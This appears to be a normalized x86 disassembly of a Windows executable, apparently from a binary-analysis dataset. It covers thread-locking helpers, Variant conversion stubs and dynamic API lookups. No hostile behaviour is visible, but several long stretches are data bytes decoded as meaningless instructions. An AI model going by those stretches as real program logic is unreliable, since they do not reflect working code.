mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1c4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cee7
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
sub_40cf38
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4089dc
mov [ rw-data ] eax
sub_40cfbc
push ebx
push esi
push edi
push ebp
call sub_4034f8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026fc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_40315c
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
sub_40d024
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d00c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d0ac
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e4c
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cfac
mov [ ebp ] eax
sub_40d0ac
push ebx
mov ebx eax
mov eax ebx
call sub_40d00c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cfac
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d0ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40d160
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_40d1ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_40d1ec
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d1a8
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d024
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cfb4
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cf94
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cfb4
test eax eax
je r-xdata
mov eax edi
call sub_40d1a8
test bl bl
je r-xdata
mov eax edi
call sub_40d1dc
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cf94
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cfa0
sub_40d288
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cfb4
mov eax ebx
call sub_40d1c0
mov eax ebx
call sub_40d1b4
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
sub_40d2d8
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d024
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d1cc
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cfa0
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cf94
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d1cc
mov eax esi
call sub_40d1c0
sub_40d344
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cf94
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d1c0
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d1c0
sub_40d3bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d3e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d457
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403220
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d45e
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403220
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d3bc
test al al
jne r-xdata
mov al 0x1
sub_40d478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d4ea
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d4cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404400
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4d3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d4fc
sbb eax 0x4000000
jae r-xdata
add al al
mov [ eax ] cl
mov ah 0x72
dec eax
add [ eax - 0x77 ] ah
dec eax
add ah bh
jb r-xdata
add al al
mov cl [ eax ]
push esp
jb r-xdata
add [ eax - 0x63ffb776 ] ah
jb r-xdata
add [ edi + eax * 4 + 0x72ac0048 ] dl
dec eax
add [ eax - 0x5bffb779 ] ah
jb r-xdata
add ah dh
xchg [ eax ] ecx
hlt
add [ eax + 0x4885 ] bl
add [ eax ] al
add [ edx + esi * 2 ] dl
dec eax
add [ ecx + ecx * 4 + 0x48 ] ch
add [ eax ] al
adc [ edx + 0x48 ] dh
add [ eax - 0x7b ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] cl
dec eax
add [ esi + eax * 4 + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jb r-xdata
add [ esi + eax * 4 + 0x724c0048 ] bl
dec eax
add [ esi + eax * 4 ] ah
dec eax
add [ edx + esi * 2 + 0x48 ] al
add al ah
mov [ eax ] cl
cmp al 0x72
dec eax
add al al
mov [ eax ] ecx
xor al 0x72
dec eax
add [ ebp + eax * 4 + 0x48 ] al
add [ edx + esi * 2 ] ch
dec eax
add [ edx + ecx * 4 + 0x72240048 ] bl
dec eax
add [ edi + eax * 4 + 0x72940048 ] bl
dec eax
add [ eax - 0x75 ] dl
dec eax
add [ edx + esi * 2 - 0x76e3ffb8 ] cl
dec eax
add [ edx + esi * 2 - 0x7713ffb8 ] al
dec eax
add [ edx + esi * 2 + 0x48 ] bh
add [ eax - 0x75 ] ch
dec eax
add [ edx + esi * 2 + 0x48 ] dh
add ah bh
mov cl [ eax ]
insb
jb r-xdata
add [ edx + ecx * 4 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add ah ch
jno r-xdata
add [ esi + eax * 4 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] al
dec eax
add al al
test [ eax ] ecx
add [ eax ] al
add [ eax ] al
add [ edx + 0x48 ] dh
add [ eax + 0x4887 ] ch
add [ eax ] al
add ah bh
jno r-xdata
add [ edi + eax * 4 + 0x280048 ] ch
add [ eax ] al
sbb al 0x72
add [ eax + 0x64004887 ] dh
jb r-xdata
add [ eax + 0x4888 ] al
add [ eax ] al
add al dl
jno r-xdata
add ah dh
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
call 0x3c411efe
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
in al 0x71
dec eax
add [ eax + 0x4887 ] dl
add [ eax ] al
add al ah
jno r-xdata
add [ eax ] bl
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
clc
jno r-xdata
dec eax
add [ edx + ecx * 4 + 0x48 ] bh
add [ edx + esi * 2 ] bl
add [ eax + 0x5c00488a ] ch
jb r-xdata
add al ah
add al dh
xchg [ eax ] cl
add [ eax ] al
add [ eax ] al
int3
add ah bh
mov [ eax ] cl
add [ eax ] al
add [ eax ] al
les esi [ ecx + 0x48 ]
add [ eax - 0x78 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add al al
jno r-xdata
add [ eax ] cl
xchg [ eax ] ecx
add [ eax ] al
add [ eax ] al
fdiv [ ecx + 0x48 ]
add [ eax - 0x7a ] dl
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jb r-xdata
add ah cl
mov [ eax ] cl
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x48 ] dh
add [ ebx + ecx * 4 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x48 ] ah
add [ eax - 0x7b ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4c004871 ] ah
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
pushfd
jno r-xdata
add [ eax + 0x4886 ] bl
add [ eax ] al
add [ ecx + esi * 2 - 0x7a9fffb8 ] ah
xchg [ eax ] ecx
add [ eax ] al
add [ eax ] al
mov ah 0x71
dec eax
add al dl
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
mov al 0x71
dec eax
add [ eax - 0x76 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 - 0x772fffb8 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x67ffb78f ] ch
xchg [ eax ] cl
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jno r-xdata
add [ eax - 0x79 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 - 0x7ab7ffb8 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb78f ] bh
add al dh
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
aam 0x71
dec eax
add [ ebp + eax * 4 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add al bl
jno r-xdata
add ah dl
mov [ eax ] cl
add [ eax ] al
add [ eax ] al
inc eax
add al ch
mov dh 0x71
add [ eax + 0x4886 ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add [ edi + eax * 4 + 0x48 ] bh
add [ eax ] al
pushad
jno r-xdata
add [ ebx + ecx * 4 + 0x48 ] bl
add [ eax ] al
cwde
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d948
retn
mov eax rw-data
call sub_40d3ac
call sub_40cf18
call sub_40c10c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
mov eax rw-data
mov edx [ r-xdata ]
call sub_405224
mov eax rw-data
mov edx [ r-xdata ]
call sub_405224
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_404620
mov eax rw-data
call sub_403f40
add al cl
test [ eax ] ecx
add [ eax ] al
add [ eax ] al
xchg esp eax
jno r-xdata
xor eax eax
push ebp
push sub_40d941
push [ fs : eax ]
mov [ fs : eax ] esp
add [ eax * 4 + 0x48 ] dh
add [ eax ] al
nop
jno r-xdata
inc [ rw-data ]
jne r-xdata
mov [ eax ] esp
add [ edx + ecx * 4 + 0x48 ] cl
add [ eax ] al
sub_40d94c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d9b4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9bb
retn
mov eax sub_40d4fc
call sub_403c68
mov eax r-xdata
call sub_403c90
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c088
call sub_40c18c
call sub_40cf38
call sub_40cad0
mov eax rw-data
mov edx r-xdata
call sub_403f94
sub_40d9ec
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40da40
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408518
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daa1
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40daac
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db06
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098ec
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db0d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40db18
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db72
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098c0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db79
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40db84
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbde
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b138
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbe5
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40dbf0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409918
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc51
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40dc5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dcc9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408624
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcd0
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_40dcdc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dd3c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409874
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40476c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd43
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40dd4c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40ddac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a8c4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40476c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddb3
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40ddbc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de20
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4086c0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40476c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de27
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40de50
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40de7c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d9ec
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da1c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da1c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da34
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da40
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daac
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db18
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db84
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf0
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc5c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcdc
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd4c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ddbc
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e1ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1b4
retn
sub_40e1ea
leave
loope r-xdata
add [ eax ] al
add [ eax ] al
add dh dl
loope r-xdata
les esi [ ebx ]
inc eax
add al cl
je r-xdata
add [ eax ] al
add [ eax ] al
add al ah
loope r-xdata
jo r-xdata
popad
outsb
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
insd
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebx + eax * 2 + 0x41 ] cl
add [ eax + 0x44 ] dl
inc ecx
add ah bl
inc ebx
inc ecx
add [ eax ] dl
inc esp
inc ecx
add al dh
inc ebx
inc ecx
add [ esp + eax * 2 ] ch
inc ecx
add al bl
inc ebx
inc ecx
add [ edx + eax * 2 + 0x41 ] cl
add [ edx + eax * 2 + 0x43100041 ] al
inc ecx
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ eax + 0x42 ] al
inc ecx
add [ esp + eax * 2 ] ah
inc ecx
add al bl
inc edx
inc ecx
add ah cl
inc edx
inc ecx
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
0x80040e1 0x0
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
outsb
xor eax [ eax ]
popad
outsb
je r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
pop ss
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] bl
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
xor bl ah
inc eax
jns r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl ah 0x40
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
in al 0x40
outsd
jb r-xdata
pop esp
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jb r-xdata
xchg esp eax
jecxz r-xdata
inc ebp
push esi
inc eax
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
push ss
nop
mov eax 0x70040e2
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
adc eax 0x72615645
jns r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
pop ss
outsb
